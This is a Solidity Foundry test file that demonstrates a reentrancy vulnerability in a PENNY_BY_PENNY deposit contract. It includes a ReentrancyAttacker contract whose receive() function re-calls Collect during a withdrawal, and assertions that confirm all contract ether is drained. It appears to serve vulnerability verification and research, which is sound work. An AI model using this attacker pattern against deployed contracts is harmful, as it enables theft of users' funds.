// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol";

contract PENNY_BY_PENNY_Test is Test {
    PENNY_BY_PENNY penny;
    LogFile logFile;
    ReentrancyAttacker attacker;
    uint256 constant DEPOSIT_AMOUNT = 2 ether;
    uint256 constant WITHDRAW_AMOUNT = 1 ether;
    
    function setUp() public {
        // Setup contracts
        penny = new PENNY_BY_PENNY();
        logFile = new LogFile();
        penny.SetLogFile(address(logFile));
        
        // Set minimum sum to 0.5 ether to allow WITHDRAW_AMOUNT (1 ether)
        penny.SetMinSum(0.5 ether);

        // Deploy attacker
        attacker = new ReentrancyAttacker(penny);
        
        // Fund attacker and make deposit
        vm.deal(address(attacker), DEPOSIT_AMOUNT);
        attacker.deposit{value: DEPOSIT_AMOUNT}(0);
        
        // Advance time to unlock deposited funds
        vm.warp(block.timestamp + 1 days);
    }

    function testReentrancyVulnerability() public {
        // Initialize balances for verification
        uint256 initialContractBalance = address(penny).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Contract Balance: %s", initialContractBalance);
        console.log("Attacker Balance: %s", initialAttackerBalance);
        
        console.log("--- Trigger Attack ---");
        // Execute reentrancy attack
        attacker.attack(WITHDRAW_AMOUNT);

        uint256 finalContractBalance = address(penny).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Contract Balance: %s", finalContractBalance);
        console.log("Attacker Balance: %s", finalAttackerBalance);
        
        // Calculate changes
        uint256 contractBalanceChange = initialContractBalance - finalContractBalance;
        uint256 attackerBalanceChange = finalAttackerBalance - initialAttackerBalance;
        bool fundsDrained = (finalContractBalance == 0);
        bool attackerGainedFunds = (attackerBalanceChange == initialContractBalance);
        
        console.log("\n--- Verification ---");
        console.log("Expected ETH drained from contract: %s", initialContractBalance);
        console.log("Actual ETH drained: %s", contractBalanceChange);
        console.log("Attacker gained ETH: %s", attackerBalanceChange);
        
        // Final vulnerability verification
        if (fundsDrained && attackerGainedFunds) {
            console.log("\nVulnerability Exists: Reentrancy attack successfully drained all contract funds");
        } else {
            console.log("\nVulnerability not Exist: Contract funds remain intact or unexpected balance change occurred");
        }
        
        // Additional assertions (preserved from original PoC)
        assertEq(finalContractBalance, 0, "Contract funds not drained");
        assertEq(finalAttackerBalance, initialAttackerBalance + initialContractBalance, "Attacker didn't receive all contract ETH");
    }
}

contract ReentrancyAttacker {
    PENNY_BY_PENNY penny;
    uint256 public reentrancyCount;

    constructor(PENNY_BY_PENNY _penny) {
        penny = _penny;
    }

    function deposit(uint256 lockTime) public payable {
        penny.Put{value: msg.value}(lockTime);
    }

    function attack(uint256 amount) public {
        penny.Collect(amount);
    }

    receive() external payable {
        // Perform reentrancy during first withdrawal
        if (reentrancyCount == 0) {
            reentrancyCount++;
            penny.Collect(msg.value);
        }
    }
}